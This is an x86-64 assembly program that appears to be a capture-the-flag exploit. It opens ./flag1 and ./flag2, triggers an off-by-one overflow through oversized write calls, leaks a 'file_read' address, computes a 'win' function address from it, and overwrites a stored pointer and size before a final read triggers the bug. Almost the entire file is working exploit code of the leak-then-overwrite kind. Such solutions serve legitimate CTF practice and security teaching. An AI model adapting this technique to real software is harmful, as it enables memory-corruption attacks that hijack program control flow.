
; Syscall convention: rdi, rsi, rdx

; .global _start
_start:
	push rbp
	mov rbp, rsp
	sub rsp, 0x900

	; Hello message
	mov rdi, 1
	lea rsi, flag_1_str
	mov rdx, 8
	call write_sys

	lea rdi, [flag_1_str]
	call open_sys
	mov [rsp+8], rax

	lea rdi, [flag_2_str]
	call open_sys
	mov rcx, rax

	; Set values that should be overwritten
	mov QWORD[rsp+0x300], 0xffffffffffffffff		; Should be the size
	mov DWORD[rsp+0x318], eax				; fd of the flag2
	; mov [rsp+0x318+0x22c], win_addr

	; Exploit off-by-one
	mov rdi, [rsp+8]
	lea rsi, [rsp+0x100] ; Dummy memory address
	mov rdx, 0x201
	call write_sys

	mov rdi, [rsp+8]
	lea rsi, [rsp+0x100]
	mov rdx, 0x207
	call write_sys

	; Read address of the file_read
	mov rdi, [rsp+8]
	lea rsi, [rsp+0x100]
	mov rdx, 0x45c
	call read_sys

	mov QWORD[rsp+0x300], 0xffffffffffffffff		; Should be the size
	mov DWORD[rsp+0x318], ecx				; fd of the flag2
	mov rdx, [rsp+0x548]					; Leaked value of the file_read

	sub rdx, 0x11b							; In rdx virtual address of win
	mov [rsp+0x548], rdx

	mov rdi, [rsp+8]
	lea rsi, [rsp+0x100]
	mov rdx, 0x45c
	call write_sys


	; Trigger vuln
	mov rdi, rcx
	lea rsi, [rsp+0x100]
	mov rdx, 0x208
	call read_sys

	ret





read_sys:
; fd, buf, count
	mov eax, 0
	syscall
	ret
write_sys:
; fd, buf, count
	mov eax, 1
	syscall
	ret

open_sys:
; filename, flags(ignored), mode(ignored)
	mov eax, 2
	syscall
	ret



flag_1_str:
	db "./flag1", "\0"

flag_2_str:
	db "./flag2", "\0"

